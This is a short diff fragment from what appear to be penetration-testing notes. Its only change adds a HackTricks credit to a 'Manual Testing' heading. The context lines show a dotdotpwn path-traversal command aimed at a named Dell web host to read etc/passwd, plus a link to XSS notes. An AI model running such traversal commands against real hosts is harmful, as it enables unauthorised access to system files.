@@ -23,7 +23,7 @@ dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f 
 dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f "etc/passwd" -k "root" -d 20 -b
 ```
 
-### Manual Testing
+### Manual Testing (Credit: HackTricks)
 
 - **XSS** → [**XSS**](https://www.notion.so/XSS-d134ad33750041348b702bd15264e165?pvs=21) →
     
